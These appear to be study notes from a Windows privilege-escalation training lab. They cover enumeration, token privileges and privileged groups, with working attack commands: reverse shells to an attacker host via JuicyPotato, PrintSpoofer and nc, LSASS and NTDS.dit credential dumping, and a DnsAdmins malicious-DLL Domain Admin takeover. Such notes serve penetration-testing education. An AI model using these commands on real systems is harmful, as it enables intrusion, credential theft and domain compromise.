# 🧭 Situational Awareness 

Situational awareness is essential during penetration tests or any security assessment. Before attempting privilege escalation, we must fully understand the host, its environment, protections, and its network placement. This allows us to make informed, proactive decisions rather than reactive ones.

## 🌐 Network Information

Gathering network information early can reveal:

* **Dual-homed systems** (hosts with multiple interfaces on different networks)
* **Potential lateral movement paths**
* **Domain infrastructure details**
* **Recently communicated hosts** (from ARP tables)
* **Routing behavior**

This information may help directly or indirectly in privilege escalation or in pivoting deeper into the environment.

## 🔌 Interface / IP / DNS Enumeration

### `ipconfig /all` Output Highlights

| Interface                         | IP Address    | Notes                        |
| --------------------------------- | ------------- | ---------------------------- |
| **Ethernet1**                     | 192.168.20.56 | Static, DNS = 8.8.8.8        |
| **Ethernet0**                     | 10.129.43.8   | DHCP, DNS = 1.1.1.1, 8.8.8.8 |
| Multiple ISATAP & Teredo adapters | —             | IPv6 tunneling, disconnected |

### Key Observations

* The host is **dual-homed**:

  * **192.168.20.0/24**
  * **10.129.0.0/16**
* Appears to belong to the **.htb domain** (DNS suffix).
* Two different gateways:

  * 10.129.0.1
  * 192.168.20.1
* Could serve as a **pivot point** between network segments.

## 🧩 ARP Table Enumeration

### `arp -a`

Shows recently communicated hosts for each interface.

* On **10.129.43.8**, several dynamic ARP entries → potential targets for lateral movement.
* On **192.168.20.56**, mostly broadcast/multicast entries → minimal local activity.

### Why ARP Matters

* Identifies **active hosts** the machine talks to.
* Indicates systems admins may use (e.g., RDP/WinRM connections).
* Helps map reachable systems without scanning (stealthier).


## 🧭 Routing Table Analysis

### Key Observations from `route print`

* Two default routes exist:

  * Primary: **10.129.0.1** (metric 25)
  * Secondary: **192.168.20.1** (metric 271)
* Confirms the system is dual-homed and prefers the **10.129.x.x** interface.
* IPv6 routing also enabled.

### Why This Matters

* Defines where traffic exits the host.
* Helps identify pivoting routes.
* Useful for SOCKS tunnels, proxies, and redirectors during escalation or lateral movement.


## 🛡️ Windows Defender Status

### `Get-MpComputerStatus` Highlights

| Feature                   | Status     |
| ------------------------- | ---------- |
| Antivirus Enabled         | ✔          |
| Antispyware Enabled       | ✔          |
| Real-Time Protection      | ❌ Disabled |
| On-Access Protection      | ❌ Disabled |
| Network Inspection System | ❌ Disabled |

### Implications

* Defender is installed but **most active protections are disabled**.
* May permit unsigned tools or enumeration scripts without alerting.
* Still must consider signature-based detection.

## 📦 AppLocker Policy Enumeration

### `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Default rules include:

* Allow all **signed packaged apps**
* Allow execution of files in:

  * `%PROGRAMFILES%\*`
  * `%WINDIR%\*`
* Administrators can run **all files/scripts**
* Everyone can run signed installers & scripts in specific directories

### Notable Finding

* Execution **outside Program Files/Windows** may be restricted for non-admin users.
* Generic paths like `C:\Users\*\Desktop\tool.exe` may be blocked.

## 🧪 Testing AppLocker Enforcement

### Command

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

### Result

```
PolicyDecision: Denied
MatchingRule: c:\windows\system32\cmd.exe
```

### Meaning

* Even though cmd.exe is in the Windows directory, its execution may be restricted for **Everyone**.
* Indicates the presence of **AppLocker enforcement** that must be bypassed.

---

Below is a clean, organized **Markdown note set** summarizing the key concepts and commands from your Windows privilege‑escalation initial enumeration section.
You can drop this directly into Obsidian/Notion/CherryTree/etc.

---

# Initial Enumeration Notes

## 🎯 Goal

After obtaining a low‑privileged shell on a Windows host, enumerate the system to identify paths to escalate to:

* **NT AUTHORITY\SYSTEM**
* **Local Administrator**
* **Any user in the Administrators group**
* **Domain users with local admin**
* **Domain Admins**

Enumeration provides situational awareness to identify vulnerabilities, misconfigurations, and credential exposure.

## 🔍 Key Areas of Windows Enumeration

## 1. **System Information**

### 🔧 Tasklist — Running Processes & Services

```cmd
tasklist /svc
```

* Identify unusual processes.
* Look for services running as **SYSTEM** or **Administrator**.
* Non‑standard apps = potential escalation (e.g., FileZilla, custom services).

### 📝 Know common Windows processes:

* `smss.exe`
* `csrss.exe`
* `winlogon.exe`
* `lsass.exe`
* `svchost.exe`

## 2. **Environment Variables**

```cmd
set
```

### Look for:

* `PATH` misconfigurations → DLL hijacking potential.
* Mapped home drives or shares.
* Roaming profiles: persistence via `Startup` folder.

## 3. **Detailed System Configuration**

### Systeminfo

```cmd
systeminfo
```

Reveals:

* OS + version + build
* Patch level (important for exploit discovery)
* Boot time (long uptime → likely unpatched)
* Manufacturer (VM detection)
* Hotfixes (unless hidden)
* Network adapters

## 4. **Patch & Hotfix Enumeration**

If `systeminfo` hides hotfixes:

### WMIC:

```cmd
wmic qfe
```

### PowerShell:

```powershell
Get-HotFix
```

Compare missing patches against known privilege-escalation CVEs.

## 5. **Installed Software**

### WMIC:

```cmd
wmic product get name
```

### PowerShell:

```powershell
Get-WmiObject -Class Win32_Product | select Name, Version
```

What to look for:

* Software with known exploits.
* Tools storing credentials (e.g., FileZilla, Putty, SQL clients).
* Services running vulnerable or outdated versions.

## 6. **Network Information**

### Netstat

```cmd
netstat -ano
```

Identify:

* Internal‑only services exploitable from local shell.
* High‑value ports: `1433` (SQL), `21` (FTP), `80`, `445`, `3389`.

## 7. **User & Group Enumeration**

### Logged‑in Users

```cmd
query user
```

### Current User

```cmd
whoami
echo %USERNAME%
```

### User Privileges

```cmd
whoami /priv
```

Key escalation‑relevant privileges:

* **SeImpersonatePrivilege**
* **SeAssignPrimaryTokenPrivilege**
* **SeBackupPrivilege**
* **SeRestorePrivilege**

#### Group Memberships

```cmd
whoami /groups
```

## 8. **Local Users**

```cmd
net user
```

What to check:

* Reused naming patterns (e.g., `bob` vs `bob_adm`)
* Presence of service accounts
* Users with admin‑like names


## 9. **Local Groups**

```cmd
net localgroup
```

Inspect members of high‑priv groups:

```cmd
net localgroup administrators
```

Look for:

* Non‑standard users
* Domain users with local admin access

## 10. **Password & Account Policy**

```cmd
net accounts
```

Reveals:

* Password length
* Lockout settings
* Password expiration
* Weak policy ⇒ password spraying opportunity


## 🧭 What to Look For During Enumeration

### 🔓 **Misconfigurations**

* Writable directories in PATH
* Services running as SYSTEM but with weak permissions
* Unquoted service paths
* Startup folder access

### 🔑 **Credential Exposure**

* User home directories containing:

  * `.txt` or `.xlsx` files
  * Scripts with passwords
  * Private keys
  * Saved session files

### 🕵️ **Escalation Indicators**

* Long system uptime → likely unpatched
* Tools like SQL Server, FileZilla, VMware Tools
* Privileged tokens (Impersonation)
* Logged‑in privileged users

---

# Communication With Processes

## 1. Overview

Privilege escalation often involves analyzing running processes and how they communicate. Even non-administrator processes can provide paths to higher privileges—especially if they run with impersonation privileges or insecure configurations.


## 2. Access Tokens (Windows)

* Access tokens define the **security context** of a process or thread.
* A token contains:

  * User identity
  * Privileges
  * Group memberships
* When a user logs in, Windows issues a token.
* Every process the user interacts with receives a copy of this token to determine access rights.

## 3. Enumerating Network Services

Processes frequently communicate through **network sockets** (DNS, HTTP, SMB, etc.).

### 🔍 Using `netstat` to View Active Connections

```cmd
netstat -ano
```

Key fields:

* **Local Address:** where service is listening
* **Foreign Address:** remote connection target
* **PID:** process associated with the connection
* **State:** LISTENING, ESTABLISHED, etc.

### 🔑 What to Look For

Look for services listening on:

* **127.0.0.1** or **::1** (loopback interfaces)
* **NOT listening** on:

  * The real IP address
  * 0.0.0.0 (all interfaces)

Services bound only to localhost are often **poorly secured** because admins assume “no one external can access them.”

### Example: Vulnerable Local Port

* Port **14147** → FileZilla Admin interface
* Potential to:

  * Extract stored FTP credentials
  * Create an FTP share pointing to `C:\`
  * Gain access as the FileZilla service account (often with high privileges)


## 4. More Examples of Network-Based Privilege Escalation

### 🔸 Splunk Universal Forwarder

* Default configuration: **no authentication**
* Allows remote deployment of applications
* Runs as **SYSTEM**
* Can lead to **remote code execution (RCE)**

### 🔸 Erlang Port (25672)

Used by distributed systems such as:

* **RabbitMQ**
* **CouchDB**
* **SolarWinds**

Issues:

* Uses a **cookie** for authentication
* Cookies often weak:

  * Example: RabbitMQ uses default cookie `rabbit`
* Cookie stored in world-readable config files → privilege escalation


## 5. Named Pipes (Inter-Process Communication)

Named pipes allow processes to communicate via shared memory.

### Types

* **Anonymous pipes:** Simple, one-way
* **Named pipes:** Two-way communication, persistent name (e.g. `\\.\pipe\msagent_12`)

### Named Pipes in Cobalt Strike

Example workflow:

1. Beacon creates pipe: `\\.\pipe\msagent_12`
2. Beacon injects command into another process
3. Output written to the pipe
4. Server reads from pipe and displays results

Attackers often rename pipes to look legitimate (e.g., `mojo`, similar to Chrome's Mojo IPC).

## 6. Enumerating Named Pipes

### Using Sysinternals `PipeList`

```cmd
pipelist.exe /accepteula
```

Shows:

* Pipe name
* Number of instances
* Max allowed instances

### Using PowerShell

```powershell
gci \\.\pipe\
```

## 7. Checking Pipe Permissions

Use **Accesschk** to view DACLs (permissions).

### Example: LSASS named pipe

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

Expected:

* Only **Administrators** have full access
* Everyone else: limited read/write attributes

## 8. Named Pipe Privilege Escalation Example

## WindscribeService Example

### Step 1: Find writable pipes

```cmd
accesschk.exe -w \pipe\* -v
```

### Step 2: Inspect specific pipe

```cmd
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

Finding:

* `Everyone` has **FILE_ALL_ACCESS**
* Means any authenticated user can **read, write, and execute** operations on the pipe

### Result:

This allows an attacker to:

* Interact directly with the service
* Abuse insecure functionality
* Execute code as the **service account**
* Often escalates to **SYSTEM**

---

# Windows Privileges Overview

## **1. What Are Windows Privileges?**

* Privileges = rights allowing specific system-level actions (load drivers, debug processes, backup files, impersonate users, etc.).
* Different from *access rights*, which control access to objects (files, registry, services).
* Privileges are stored in local/domain security databases and added to the **access token** at login.
* Most privileges start **Disabled** and must be enabled before use.

### **Why We Care**

* Many privileges can be **abused for privilege escalation** to:

  * Local Administrator
  * SYSTEM
  * Domain Admin


## **2. Windows Authorization Basics**

* Windows uses **Security Principals** (users, computers, groups, processes).
* Each principal has a **SID** (Security Identifier).
* Access to an object is decided by comparing:

  * Your **access token** (User SID, Group SIDs, Privileges)
  * Object’s **DACL** (access rights defined in ACEs)

**Attack Goal:**
Find a way to insert yourself into this authorization chain or abuse privileges to elevate.


## **3. Privileged Groups (High-Value Targets)**

### **🔥 Top Escalation-Relevant Groups**

| Group                                                  | Why Important                                               |
| ------------------------------------------------------ | ----------------------------------------------------------- |
| **Administrators / Domain Admins / Enterprise Admins** | Full control everywhere                                     |
| **Backup Operators**                                   | Can backup SAM, NTDS.dit, registry → basically Domain Admin |
| **Server Operators**                                   | Manage services, SMB, backups                               |
| **Print Operators**                                    | Can load malicious printer drivers on DCs                   |
| **Hyper-V Admins**                                     | Can control virtual DCs → effectively Domain Admin          |
| **Account Operators**                                  | Modify non-protected accounts/groups                        |
| **Remote Desktop Users**                               | Often granted logon rights → lateral movement               |
| **Remote Management Users**                            | PSRemoting access to DCs                                    |
| **DNS Admins**                                         | Can load DLLs → potential SYSTEM execution                  |

⚠ Many orgs mistakenly add “normal” users to these groups → easy escalation.

## **4. Key Privileges to Know (Most Abusable)**

### **🔥 High-Risk Privileges (commonly exploited)**

| Privilege                         | Use / Abuse                                       |
| --------------------------------- | ------------------------------------------------- |
| **SeImpersonatePrivilege**        | Potato attacks (Juicy/PrintSpoofer/etc.) → SYSTEM |
| **SeDebugPrivilege**              | Open any process → inject → SYSTEM                |
| **SeBackupPrivilege**             | Copy protected files (SAM, SYSTEM, NTDS.dit)      |
| **SeRestorePrivilege**            | Overwrite protected files                         |
| **SeTakeOwnershipPrivilege**      | Take ownership of any file or object              |
| **SeLoadDriverPrivilege**         | Load unsigned kernel drivers                      |
| **SeTcbPrivilege**                | “Act as part of OS” — extremely dangerous         |
| **SeCreateSymbolicLinkPrivilege** | Abuse symlink races                               |
| **SeShutdownPrivilege**           | Can shut down DCs (DoS)                           |



## **5. How to View Assigned Privileges**

```cmd
whoami /priv
```

### **Admin (Elevated)**

* Many privileges assigned but mostly **Disabled** until enabled.
* Examples: SeDebugPrivilege, SeBackupPrivilege, SeLoadDriverPrivilege.

### **Admin (Non-Elevated)**

* Privileges appear restricted → **UAC filtering**.

### **Standard User**

* Usually only:

  * SeChangeNotifyPrivilege
  * SeIncreaseWorkingSetPrivilege

## **6. Elevation Concepts**

* Privileges may be:

  * **Assigned but Disabled** → need to be programmatically enabled.
  * **Assigned via Group Membership**
  * **Restricted by UAC** until elevated console is used.

* Windows has no built-in command to enable privileges → requires:

  * PowerShell scripts
  * Custom C#/C++ executables
  * Token adjustment tools

## **7. Detection (Defensive Note)**

* Event ID **4672**: “Special privileges assigned to new logon”

  * Great for detecting accounts suddenly receiving strong privileges.
  * Should alert if unusual accounts have admin-level privileges.

## **8. What to Look For During Enumeration**

Always check:

### **1. Privilege list**

```
whoami /priv
```

Especially:

* SeImpersonate
* SeDebug
* Backup/Restore
* TakeOwnership

### **2. Group membership**

```
whoami /groups
net user <username>
```

Look for:

* Backup Operators
* Server Operators
* DNS Admins
* RDP/Remote Management Users

### **3. UAC status**

* Token splitting can hide privileges until elevated.

### **4. Local & domain GPO privilege assignments**

* Can override local rights.


---

# SeImpersonate & SeAssignPrimaryToken

## **1. Overview**

Windows processes run with **access tokens** that identify:

* User account
* Groups
* Privileges

These tokens are stored in memory and are **not secure objects** — they can be impersonated if a process has the right privileges.

Two of the most important token-related privileges are:

* **SeImpersonatePrivilege**
* **SeAssignPrimaryTokenPrivilege**

These often allow escalation from **service account → SYSTEM**.


## **2. What SeImpersonatePrivilege Does**

**SeImpersonatePrivilege** allows a process to **impersonate another user's token** after that user has authenticated to it.

### ✔ Legitimate Use Example

* Services impersonating client accounts to access resources
* API: `CreateProcessWithTokenW`

### ✔ Why It's Dangerous

Attackers can:

1. Trick a SYSTEM process to authenticate to attacker-controlled server.
2. Capture SYSTEM token.
3. Create a new SYSTEM process.

This is the basis for most **Potato-style exploits**.


## **3. What SeAssignPrimaryTokenPrivilege Does**

Allows a process to **assign a primary token to a new process**.

### Key points:

* Paired with SeIncreaseQuotaPrivilege
* Used with API: `CreateProcessAsUser`
* Rarely granted except to service accounts
* Also abusable for escalation if present

## **4. Common Attack Scenario**

You gain RCE through:

* Web shell (ASP.NET)
* Jenkins RCE
* MSSQL xp_cmdshell
* Misconfigured service

Then check:

```cmd
whoami /priv
```

If you see:

```
SeImpersonatePrivilege   Enabled
```

→ You can almost always escalate to SYSTEM.

## **5. Example Walkthrough: MSSQL Service Abuse**

## **5.1 Connecting to SQL Server**

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Credentials example:

```
sql_dev : Str0ng_P@ssw0rd!
```

## **5.2 Enabling xp_cmdshell**

```sql
SQL> enable_xp_cmdshell
```

---

## **5.3 Confirm Account Context**

```sql
SQL> xp_cmdshell whoami
```

Output example:

```
nt service\mssql$sqlexpress01
```

## **5.4 Checking Privileges**

```sql
SQL> xp_cmdshell whoami /priv
```

Look for:

```
SeImpersonatePrivilege        Enabled
SeAssignPrimaryTokenPrivilege Disabled/Enabled
```

If SeImpersonate is present → **JuicyPotato** or **PrintSpoofer** is possible.


## **6. JuicyPotato (DCOM / NTLM Reflection Abuse)**

## **6.1 Command Example**

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

Flags:

* `-l` → listening COM port
* `-p` → program to run
* `-a` → arguments
* `-t *` → try all token creation methods

If successful:

```
NT AUTHORITY\SYSTEM
```


# **7. PrintSpoofer (Windows 10 / Server 2019+)**

JuicyPotato does **not** work on newer Windows builds.

PrintSpoofer abuses the **Print Spooler** to impersonate SYSTEM.

## **7.1 Command Example**

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
```
nc -lnvp 8443
```
If successful:

```
nt authority\system
```

---

# SeDebugPrivilege 

## **What Is SeDebugPrivilege?**

* A powerful Windows privilege that allows a user to **debug**, **inspect**, and **manipulate** any process on the system.
* By default only **Administrators** have it.
* Often assigned to **developers** or **support engineers** for debugging system components.
* Dangerous: enables access to **sensitive memory**, **kernel structures**, and **SYSTEM processes**.

## 🔥 **Why SeDebugPrivilege Matters for Attackers**

* Allows reading and writing to *any* process memory, including:

  * **LSASS.exe** → credentials
  * **SYSTEM-owned processes**
* Enables **Privilege Escalation → SYSTEM**
* Enables **credential extraction** even without local admin rights.

### 📍 **Where It’s Configured**

`Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Debug programs`

### 🕵️‍♂️ **Pentesting Tip**

* During internal tests:
  Target **developer accounts** found on LinkedIn — they often have SeDebugPrivilege.
* A user may **not** be a local admin but still have SeDebugPrivilege.

## 🔍 **Checking for SeDebugPrivilege**

```cmd
whoami /priv
```

Example output:

```
SeDebugPrivilege         Debug programs                   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking         Enabled
```

(“Disabled” just means not currently enabled in the token; it is still *held*.)


## 🧪 **Using SeDebugPrivilege – Attacks**


## **1. Dumping LSASS (Credential Theft)**

### **Using Sysinternals ProcDump:**

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

This produces a full memory dump (lsass.dmp).

### **Extracting Credentials with Mimikatz**

```cmd
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

You can retrieve:

* NTLM hashes
* Kerberos tickets
* Cleartext passwords (sometimes)

Useful for:

* **Pass-the-Hash**
* **Lateral movement**

## **2. Dump LSASS Without Tools (GUI method)**

If RDP is available:

* Open **Task Manager → Details → lsass.exe → Create dump file**
* Download the dump → analyze with Mimikatz

Useful when:

* EDR blocks procdump
* Uploading binaries is restricted

## **3. Privilege Escalation → SYSTEM via SeDebugPrivilege**

You can “steal” the token of a SYSTEM process by launching a child process through:

* **Process injection**
* **Token manipulation**

### **Using PowerShell PoC (psgetsystem)**

Syntax:

```powershell
[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, <command>, "")
```

Example:

```powershell
[MyProcess]::CreateProcessFromParent(612, "cmd.exe", "")
```

This launches **cmd.exe as SYSTEM**.

To locate SYSTEM PIDs:

```powershell
tasklist
# or
Get-Process lsass
```

## ⚙️ **Alternate SeDebugPrivilege → SYSTEM Tools**

* **psgetsystem** (decoder-it)
* **SeDebugPrivilege exploitation PoCs**
* Custom reverse shell variants

These can be modified to:

* return a reverse shell
* add a user to Administrators
* run arbitrary SYSTEM commands

Useful when:

* Only a web shell is available
* GUI/RDP is not possible

---

#  SeTakeOwnershipPrivilege 

## 🔍 Overview

**SeTakeOwnershipPrivilege** allows a user to take ownership of **any securable object** in Windows, including:

* NTFS files & folders
* Registry keys
* Services
* Processes
* Printers
* Active Directory objects

Assigns **WRITE_OWNER** permission → user can change object ownership.

**Default:** Administrators only.
**Common cases:** Backup/service accounts running VSS snapshots or backup jobs may have this privilege along with:

* SeBackupPrivilege
* SeRestorePrivilege
* SeSecurityPrivilege

This privilege is **powerful and dangerous**; misuse can break applications or cause outages.


## ⚠️ Why This Privilege Matters

If an attacker gains access to an account with SeTakeOwnershipPrivilege, they can:

* Take ownership of sensitive files
* Modify ACLs
* Read protected data (passwords, configs, secrets)
* Potentially escalate privileges
* Cause Denial-of-Service (DOS)
* Achieve RCE in some cases

Although uncommon for normal users, it is **very valuable during internal penetration tests**.


## 📍 Location in Group Policy

```
Computer Configuration  
└─ Windows Settings  
   └─ Security Settings  
      └─ Local Policies  
         └─ User Rights Assignment  
             → Take ownership of files or other objects
```

## 🧪 Privilege Review: Check Your Token

```powershell
whoami /priv
```

Example output (privilege present but **disabled**):

```
SeTakeOwnershipPrivilege      Take ownership of files or other objects      Disabled
```


## 🔓 Enabling SeTakeOwnershipPrivilege

Import helper scripts:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Now **Enabled**.


## 🎯 Selecting a Target File

In real AD environments, file shares are often misconfigured.
Example path:

```
C:\Department Shares\Private\IT\cred.txt
```

Check metadata and ownership:

```powershell
Get-ChildItem 'C:\Department Shares\Private\IT\cred.txt' |
Select FullName, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

If owner = blank or error → insufficient permissions.


## 🧭 Check Directory Ownership (fallback)

```powershell
cmd /c dir /q "C:\Department Shares\Private\IT"
```

## 🛠️ Taking Ownership

Use `takeown`:

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Success example:

```
SUCCESS: The file ... is now owned by WINLPE-SRV01\htb-student
```

Confirm:

```powershell
Get-ChildItem 'C:\Department Shares\Private\IT\cred.txt' |
Select Name, Directory, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```


## 🔐 Fixing ACLs to Allow Reading

Ownership ≠ access.
You must grant yourself permissions.

Try reading first:

```powershell
cat "C:\Department Shares\Private\IT\cred.txt"
```

If Access Denied → modify ACL:

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

Now read:

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

Example sensitive output:

```
NIX01 admin
root:n1X_p0wer_us3er!
```

## 🚨 Important Operational Notes

* Taking ownership is **destructive** and may break applications
* Always revert ownership & ACLs if possible
* Document all changes in the final report
* Avoid modifying critical system files (e.g., web.config, AD-sensitive paths)

## 🔑 When to Use SeTakeOwnershipPrivilege?

Use this technique when:

### ✔️ No admin rights

But you need access to a protected file.

### ✔️ Other privilege escalation paths fail

Backup/restore privilege abuse isn’t available
SeDebug or kernel attacks don’t apply.

### ✔️ The file share has sensitive files

Explore:

* `passwords.*`
* `pass.*`
* `creds.*`
* `*.kdbx` (KeePass)
* Scripts
* Config files
* VHD / VHDX
* OneNote
* SAM backup files


## 📂 Local Files of Interest

Examples that could store credentials:

```
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

---

# 🪪 Windows Built-in Groups


## 🔹 Overview

Windows systems include several built-in local and domain groups. Many of these grant high-impact privileges that can be abused for privilege escalation or credential extraction.

Important groups to review during assessments include:

* **Backup Operators**
* **Event Log Readers**
* **DnsAdmins**
* **Hyper-V Administrators**
* **Print Operators**
* **Server Operators**

These groups may be used by administrators for least-privilege delegation, but are often misconfigured or contain stale accounts.


## 🔹 Backup Operators

Members of this group receive:

* **SeBackupPrivilege**
* **SeRestorePrivilege**

### Capabilities:

* Traverse any folder (ignores ACLs unless there is an explicit *deny*)
* Programmatically copy files using the `FILE_FLAG_BACKUP_SEMANTICS` flag
* Log on locally to Domain Controllers
* Create backups of critical files such as:

  * **NTDS.dit**
  * **SYSTEM & SAM hives**

### 🔹 Checking Group Membership

```powershell
whoami /groups
```

### 🔹 Verifying & Enabling SeBackupPrivilege

### Check privilege:

```powershell
whoami /priv
Get-SeBackupPrivilege
```

### Enable privilege:

```powershell
Set-SeBackupPrivilege
```

### 🔹 Import Required DLL Cmdlets

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
### 🔹 Copy Protected Files Using SeBackupPrivilege

### Example: Cannot normally read file

```powershell
cat C:\Confidential\2021 Contract.txt   # Access denied
```

### Copy bypassing ACL:

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

## 🔹 Abusing on a Domain Controller

Backup Operators can log in to DCs and extract the Active Directory database.

### NTDS.dit is locked → create a shadow copy

### Using diskshadow:

```
diskshadow
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Shadow copy is now available at **E:**

### 🔹 Copy NTDS.dit Using SeBackupPrivilege

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```


### 🔹 Backup SYSTEM & SAM Hives

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### 🔹 Extracting Credentials from NTDS.dit

### Using DSInternals (PowerShell):

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' `
  -DBPath .\ntds.dit -BootKey $key
```

Outputs NTLM hashes, Kerberos keys, WDigest secrets, etc.


### 🔹 Extracting Hashes Using SecretsDump.py

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

You will obtain:

* NTLM hashes for all users
* Machine account hashes
* krbtgt hash

## 🔹 Using Robocopy in Backup Mode

Robocopy can copy protected files using the `/B` (backup mode) flag.

### Copy NTDS.dit:

```cmd
robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
```

No external tools required.

---

# 📝 Event Log Readers

## 🔍 Overview

* When **auditing of process creation (Event ID 4688)** and **command-line logging** is enabled, Windows records detailed process execution metadata.
* These logs can be forwarded to a SIEM (e.g., ElasticSearch) to detect suspicious activity such as:

  * Enumeration commands on non-admin machines (`tasklist`, `systeminfo`, etc.)
  * Reconnaissance (`dir`, `net view`, `type`, etc.)
  * Lateral movement / malware spreading commands (`at`, `wmic`, `reg`, etc.)

## 🎯 Purpose of Event Log Readers Group

* Members **can read event logs** on the local machine.
* Allows giving limited logging visibility to users without granting full administrative rights.
* Useful for power users, developers, or IT staff needing log access.

## 👤 Confirming Group Membership

```cmd
net localgroup "Event Log Readers"
```

Example output:

```
Alias name  : Event Log Readers
Members     : logger
```

## ⚠️ Security Implications

* Many Windows commands allow passing passwords directly in the command line.
* If command-line logging is enabled, **passwords are recorded in the Security log**.
* Example captured command:

  ```
  net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
  ```
* Attackers with **Event Log Readers** membership can extract this sensitive info.


## 🧰 Querying Event Logs

## Using `wevtutil`

### Search Security Log for `/user`

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

### Using alternate credentials

```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```


## Using PowerShell: `Get-WinEvent`

### Filter for Event ID 4688 (process creation)

```powershell
Get-WinEvent -LogName Security |
  where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } |
  Select-Object @{name='CommandLine'; expression={ $_.Properties[8].Value }}
```

⚠️ **Important:**
Reading the *Security* log with `Get-WinEvent` requires:

* Administrator privileges **OR**
* Modified registry permissions for:

  ```
  HKLM\System\CurrentControlSet\Services\Eventlog\Security
  ```
* **Event Log Readers membership alone is NOT enough.**

---

# 📝 DnsAdmins 

## 🔍 Overview

* **DnsAdmins** group members can manage DNS settings in Active Directory environments.
* Windows DNS supports **custom DNS plugins (DLLs)** for extended resolution logic.
* The DNS service runs as **NT AUTHORITY\SYSTEM**, meaning a loaded DLL runs with SYSTEM privileges.
* If DNS is hosted on a **Domain Controller (common setup)**, this can lead to **full domain compromise**.

## ⚠️ Why DnsAdmins Is Dangerous

1. **DNS management occurs via RPC**.
2. The registry key
   `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`
   defines a plugin DLL path.
3. **dnscmd.exe** allows DnsAdmins members to set this DLL path **without validation**.
4. When DNS is restarted:

   * The DLL is loaded as SYSTEM.
   * Arbitrary code execution → privilege escalation to Domain Admin.

This allows:

* Reverse shells
* Credential dumping (Mimikatz DLL)
* Adding users to Domain Admins


## 🧪 Attack Walkthrough

### 1. Generate Malicious DLL

Example: add a user to Domain Admins.

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' \
  -f dll -o adduser.dll
```

### 2. Host DLL on an HTTP server

```bash
python3 -m http.server 7777
```

### 3. Download DLL to the DNS server

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```


## 🛂 Permissions Testing

### Load DLL as non-privileged user (fails)

```cmd
dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll
```

→ **ERROR_ACCESS_DENIED**

### Verify DnsAdmins membership

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### Load DLL as DnsAdmins member (works)

```cmd
dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll
```

→ Registry key successfully set.



## 🔁 Forcing DLL Execution (Service Restart)

DnsAdmins members may have service-level permissions to **start/stop DNS**.

### 1. Find user SID

```cmd
wmic useraccount where name="netadm" get sid
```

### 2. Check DNS service permissions

```cmd
sc.exe sdshow DNS
```

Look for **RPWP** (SERVICE_START + SERVICE_STOP).

### 3. Stop DNS service

```cmd
sc stop dns
```

### 4. Start DNS service (loads DLL)

```cmd
sc start dns
```

### 5. Confirm escalation

```cmd
net group "Domain Admins" /dom
```


## 🧹 Cleanup Procedure (IMPORTANT)

Only perform cleanup with admin privileges.

### 1. Check registry for malicious DLL reference

```cmd
reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### 2. Delete ServerLevelPluginDll value

```cmd
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters \
  /v ServerLevelPluginDll
```

### 3. Restart DNS service

```cmd
sc.exe start dns
```

### 4. Check service status

```cmd
sc query dns
```

## 🧩 Mimilib.dll Method (Alternate Execution)

Mimikatz includes **mimilib.dll**, which can be modified to run arbitrary commands via `system()` in the DNS query handler.

Example code snippet:

```c
